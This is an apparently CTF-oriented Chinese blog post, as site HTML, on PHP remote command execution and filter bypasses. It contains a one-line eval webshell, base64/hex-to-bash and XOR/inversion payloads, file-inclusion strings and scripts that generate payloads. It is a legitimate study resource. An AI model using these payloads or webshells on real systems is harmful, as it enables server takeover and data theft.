@@ -1,0 +1,479 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>RCE | Iz0fPriestess</title><meta name="author" content="Creexile"><meta name="copyright" content="Creexile"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="命令执行利用和绕过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE">
+<meta property="og:url" content="https://4reexile.github.io/article/rce/index.html">
+<meta property="og:site_name" content="Iz0fPriestess">
+<meta property="og:description" content="命令执行利用和绕过">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://4reexile.github.io/img/tx.png">
+<meta property="article:published_time" content="2024-03-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-11-13T11:59:11.116Z">
+<meta property="article:author" content="Creexile">
+<meta property="article:tag" content="绕过">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://4reexile.github.io/img/tx.png"><link rel="shortcut icon" href="/img/prts.ico"><link rel="canonical" href="https://4reexile.github.io/article/rce/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?76992a4541699d4a08e36c0eb02f7796";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'RCE',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-11-13 19:59:11'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.png" onerror="onerror=null;src='/img/sddd.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bjt.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Iz0fPriestess"><span class="site-name">Iz0fPriestess</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">RCE</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-03-07T16:00:00.000Z" title="Created 2024-03-08 00:00:00">2024-03-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-11-13T11:59:11.116Z" title="Updated 2024-11-13 19:59:11">2024-11-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E7%9F%A5%E8%AF%86/">Web知识</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">3k</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>RCE简介</h1>
+<h2 id="利用方向"><a class="header-anchor" href="#利用方向">¶</a>利用方向</h2>
+<ul>
+<li>继承服务器权限读写文件/执行系统命令</li>
+<li>反弹shell</li>
+</ul>
+<h2 id="利用场景"><a class="header-anchor" href="#利用场景">¶</a>利用场景</h2>
+<ul>
+<li>ping</li>
+<li>DNS请求</li>
+<li>Office文档</li>
+<li>框架漏洞</li>
+<li>逻辑漏洞</li>
+</ul>
+<h2 id="前置知识"><a class="header-anchor" href="#前置知识">¶</a>前置知识</h2>
+<h3 id="管道符"><a class="header-anchor" href="#管道符">¶</a>管道符</h3>
+<table>
+<thead>
+<tr>
+<th>管道符</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>;</td>
+<td>AB都执行</td>
+</tr>
+<tr>
+<td>&amp;</td>
+<td>AB都执行</td>
+</tr>
+<tr>
+<td>&amp;&amp;</td>
+<td>A为真时执行B</td>
+</tr>
+<tr>
+<td>|</td>
+<td>显示B执行结果</td>
+</tr>
+<tr>
+<td>||</td>
+<td>A为假时执行B,否则只执行A</td>
+</tr>
+</tbody>
+</table>
+<h3 id="可利用函数"><a class="header-anchor" href="#可利用函数">¶</a>可利用函数</h3>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>使用例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>preg_replace()</td>
+<td><code>Preg_replace(&quot;/(.*)/e&quot;,'\\1',$_GET['a']);</code><br /><code>Preg_replace(&quot;/\[(.*)\]/e&quot;,'\\1',$_GET['a']);</code><br />传入a=phpinfo()</td>
+</tr>
+<tr>
+<td>assert()</td>
+<td><code>assert($_GET['a']);</code></td>
+</tr>
+<tr>
+<td>eval()</td>
+<td><code>eval($_GET['a']);</code></td>
+</tr>
+<tr>
+<td>call_user_func()</td>
+<td><code>call_user_func($_GET['a'],$_GET['b']);</code></td>
+</tr>
+<tr>
+<td>$a($b)</td>
+<td>前system后ls</td>
+</tr>
+<tr>
+<td>system</td>
+<td>ls,whomai,cat…</td>
+</tr>
+<tr>
+<td>exec</td>
+<td>无回显,和echo等同时用,与system相同</td>
+</tr>
+<tr>
+<td>shell_exec</td>
+<td>同上</td>
+</tr>
+<tr>
+<td>passthru</td>
+<td>同system</td>
+</tr>
+<tr>
+<td>popen</td>
+<td><code>popen(&quot;whoami &gt;&gt; 1.txt&quot;.'r');</code></td>
+</tr>
+<tr>
+<td>反引号</td>
+<td>echo `whoami`</td>
+</tr>
+</tbody>
+</table>
+<h3 id="可能用到的"><a class="header-anchor" href="#可能用到的">¶</a>可能用到的</h3>
+<p>可能的命令</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一句话木马</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="comment">// 当前位置</span></span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// 尝试读文件</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;c:\windows\system32\drivers\etc\hosts&#x27;</span>));</span><br><span class="line"><span class="comment">// 写马</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;php phpinfo();?&gt;&quot;</span> &gt; phpinfo.php</span><br><span class="line"><span class="comment">// 查看文件</span></span><br><span class="line">type c:\windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>
+<p>可能的例子</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果源码:</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="number">1</span>],<span class="variable">$_POST</span>[<span class="number">2</span>]));</span><br><span class="line"><span class="comment">// 尝试写shell</span></span><br><span class="line"><span class="number">1</span>=shell.php&amp;<span class="number">2</span>=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>()<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="RCE相关漏洞"><a class="header-anchor" href="#RCE相关漏洞">¶</a>RCE相关漏洞</h2>
+<p>Spring WebFlow 远程代码执行(CVE-2017-4971)</p>
+<p>S2-053 远程代码执行</p>
+<h1>绕过</h1>
+<h2 id="过滤字符"><a class="header-anchor" href="#过滤字符">¶</a>过滤字符</h2>
+<h3 id="过滤空格"><a class="header-anchor" href="#过滤空格">¶</a>过滤空格</h3>
+<p>代替空格:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">%20(空格)</span><br><span class="line">%09(tab)</span><br><span class="line">$IFS$9</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS</span><br><span class="line">&#123;cat,/flag&#125;	(这是可以用的吗?)</span><br></pre></td></tr></table></figure>
+<h3 id="过滤下划线"><a class="header-anchor" href="#过滤下划线">¶</a>过滤下划线</h3>
+<p>下划线<code>_</code>被过滤，如果是再php8以下，变量名中的第一个非法字符<code>[</code>会被替换为下划线<code>_</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N[S.S等效于N_S.S</span><br><span class="line">php需要接收e_v.a.l参数,给e[v.a.l传参即可</span><br></pre></td></tr></table></figure>
+<h3 id="过滤部分符号"><a class="header-anchor" href="#过滤部分符号">¶</a>过滤部分符号</h3>
+<p>不需要引号也可以利用GET/POST传参, 甚至过滤数字/左尖括号/小括号/等号/冒号都能用这个; 直接变为文件包含</p>
+<p>其实就是将闭合语句, 文件包含和php伪协议结合</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 读文件</span><br><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line"># 写文件, 过滤就用base64编码</span><br><span class="line">?c=include$_GET[&quot;a&quot;]?&gt;&amp;a=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line"># 甚至包含日志</span><br><span class="line">?c=include$_GET[&quot;a&quot;]?&gt;&amp;a=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<h3 id="特殊情况"><a class="header-anchor" href="#特殊情况">¶</a>特殊情况</h3>
+<ol>
+<li>过滤<code>=</code>的时候, <code>a=1</code>中这个等号是传参作用而不是字符, 不会被过滤</li>
+<li>正则表达式里面是中文符号</li>
+</ol>
+<h2 id="过滤字符串"><a class="header-anchor" href="#过滤字符串">¶</a>过滤字符串</h2>
+<h3 id="反斜杠绕过"><a class="header-anchor" href="#反斜杠绕过">¶</a>反斜杠绕过</h3>
+<p>主要是应对对预过滤关键词, 在关键词中插入反斜杠即可</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">c\at /flag</span><br><span class="line">l\s /</span><br></pre></td></tr></table></figure>
+<h3 id="拼接绕过"><a class="header-anchor" href="#拼接绕过">¶</a>拼接绕过</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /flag	</span><br><span class="line"># 变为	</span><br><span class="line">b=ag;cat /fl\$b</span><br></pre></td></tr></table></figure>
+<h3 id="引号绕过"><a class="header-anchor" href="#引号绕过">¶</a>引号绕过</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//如cat、ls被过滤</span></span><br><span class="line">ca<span class="string">&quot;&quot;</span>t /flag</span><br><span class="line">l<span class="string">&#x27;s&#x27;</span> /</span><br></pre></td></tr></table></figure>
+<h3 id="通配符绕过"><a class="header-anchor" href="#通配符绕过">¶</a>通配符绕过</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//如flag被过滤</span></span><br><span class="line">cat /f???</span><br><span class="line">cat /fl*</span><br><span class="line">cat /f[a-z]&#123;<span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="编码绕过"><a class="header-anchor" href="#编码绕过">¶</a>编码绕过</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//base64编码绕过,编码cat /flag，反引号、| bash、$()用于执行系统命令</span></span><br><span class="line">`<span class="keyword">echo</span> Y2F0IC9mbGFn | base64 -d`</span><br><span class="line"><span class="keyword">echo</span> Y2F0IC9mbGFn | base64 -d | bash</span><br><span class="line">$(<span class="keyword">echo</span> Y2F0IC9mbGFn | base64 -d)</span><br><span class="line"> </span><br><span class="line"><span class="comment">//hex编码绕过，编码cat /flag,| bash用于执行系统命令</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;636174202f666c6167&#x27;</span> | xxd -r -p | bash</span><br><span class="line"> </span><br><span class="line"><span class="comment">//shellcode编码</span></span><br><span class="line"><span class="comment">//十六进制编码</span></span><br></pre></td></tr></table></figure>
+<h3 id="反引号绕过"><a class="header-anchor" href="#反引号绕过">¶</a>反引号绕过</h3>
+<p>反引号里面的东西会被当作命令执行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 等效于打开ls目录下的文件</span></span><br><span class="line">cat `ls`</span><br></pre></td></tr></table></figure>
+<h3 id="取反绕过"><a class="header-anchor" href="#取反绕过">¶</a>取反绕过</h3>
+<p>有更为完善的脚本, 只展示原理</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//取反传参</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//输出得到取反传参内容</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;?cmd=(~&quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;)(~&quot;</span>.<span class="variable">$d</span>.<span class="string">&quot;);&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="异或绕过"><a class="header-anchor" href="#异或绕过">¶</a>异或绕过</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 异或构造Python脚本</span></span><br><span class="line">valid = <span class="string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span></span><br><span class="line"> </span><br><span class="line">answer = <span class="built_in">input</span>(<span class="string">&#x27;输入异或构造的字符串:&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">tmp1, tmp2 = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> valid:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> valid:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(c):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;&quot;<span class="subst">&#123;tmp1&#125;</span>&quot;^&quot;<span class="subst">&#123;tmp2&#125;</span>&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="管道符绕过"><a class="header-anchor" href="#管道符绕过">¶</a>管道符绕过</h3>
+<p>比如剩下了<code>|</code>, 可以写个程序绕过;</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义要构造的字符串</span></span><br><span class="line">str1 = [<span class="string">&quot;system&quot;</span>, <span class="string">&quot;cat flag.php&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有效字符直接定义为字符串</span></span><br><span class="line">valid_chars = <span class="string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz^+~$[]&#123;&#125;&amp;-&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> target <span class="keyword">in</span> str1:</span><br><span class="line">    t1, t2 = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> target:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> valid_chars:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> valid_chars:</span><br><span class="line">                hex_i = urllib.parse.quote(i)</span><br><span class="line">                hex_j = urllib.parse.quote(j)</span><br><span class="line">                <span class="comment"># 使用按位或运算符构造字符</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(urllib.parse.unquote(hex_i)) | <span class="built_in">ord</span>(urllib.parse.unquote(hex_j))) == k:</span><br><span class="line">                    t1 += hex_i</span><br><span class="line">                    t2 += hex_j</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;(\&quot;<span class="subst">&#123;t1&#125;</span>\&quot;|\&quot;<span class="subst">&#123;t2&#125;</span>\&quot;)&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="更换函数绕过"><a class="header-anchor" href="#更换函数绕过">¶</a>更换函数绕过</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 我在最前面写了可利用函数都算</span></span><br><span class="line">system -&gt; passthru</span><br><span class="line"><span class="comment"># 读取根目录</span></span><br><span class="line">c=<span class="keyword">eval</span>(<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>)););</span><br><span class="line"><span class="comment"># 读文件</span></span><br><span class="line">c=<span class="keyword">eval</span>(<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])););&amp;a=/flag</span><br><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">readfile</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="comment"># 一行一行读取</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line"><span class="comment"># 一行一个一个字符取</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line"><span class="comment"># 一行一行读取</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line"><span class="comment"># 文件包含加伪协议</span></span><br></pre></td></tr></table></figure>
+<h3 id="cat替换"><a class="header-anchor" href="#cat替换">¶</a>cat替换</h3>
+<p>这个单独拿出来讲, 因为确实多</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>tac</td>
+<td>与cat相反,按行反向输出</td>
+</tr>
+<tr>
+<td>more</td>
+<td>按页显示,用于文件内容多且不能滚动屏幕</td>
+</tr>
+<tr>
+<td>less</td>
+<td>和more类似</td>
+</tr>
+<tr>
+<td>tail</td>
+<td>查看文件末几行</td>
+</tr>
+<tr>
+<td>head</td>
+<td>查看文件首几行</td>
+</tr>
+<tr>
+<td>nl</td>
+<td>cat加上行号</td>
+</tr>
+<tr>
+<td>od</td>
+<td>二进制方式读文件</td>
+</tr>
+<tr>
+<td>xxd</td>
+<td>二进制方式读文件,同时由可读字符显示</td>
+</tr>
+<tr>
+<td>sort</td>
+<td>排序文件</td>
+</tr>
+<tr>
+<td>uniq</td>
+<td>报告或删除文件的重复行</td>
+</tr>
+<tr>
+<td>file -f</td>
+<td>报错文件内容</td>
+</tr>
+<tr>
+<td>grep</td>
+<td>过滤查找字符串</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>附</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">od</span> -A d -c /flag	转入可读字符</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">grep flag /flag	查找字符串</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="闭合语句绕过"><a class="header-anchor" href="#闭合语句绕过">¶</a>闭合语句绕过</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// php标签闭合绕过</span></span><br><span class="line"><span class="comment">// 如果还需要在该程序内, 利用;等闭合即可</span></span><br><span class="line"><span class="meta">?&gt;</span> <span class="meta">&lt;?=</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span> <span class="meta">&lt;?</span></span><br></pre></td></tr></table></figure>
+<h3 id="回溯过限绕过"><a class="header-anchor" href="#回溯过限绕过">¶</a>回溯过限绕过</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// php正则回溯次数大于1000000次返回False</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello world&#x27;</span>+<span class="string">&#x27;h&#x27;</span>^<span class="number">1000000</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/hello.*world/is&quot;</span>,<span class="variable">$a</span>) == False</span><br></pre></td></tr></table></figure>
+<h2 id="无回显"><a class="header-anchor" href="#无回显">¶</a>无回显</h2>
+<p>函数执行结果无回显, 可以外带/写文件/反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">// 无回显RCE，如exec()函数，可将执行结果输出到文件再访问文件</span><br><span class="line">ls / | tee 1.txt</span><br><span class="line">cat /flag | tee 2.txt</span><br><span class="line">eval(print`c\at /flag`;)</span><br></pre></td></tr></table></figure>
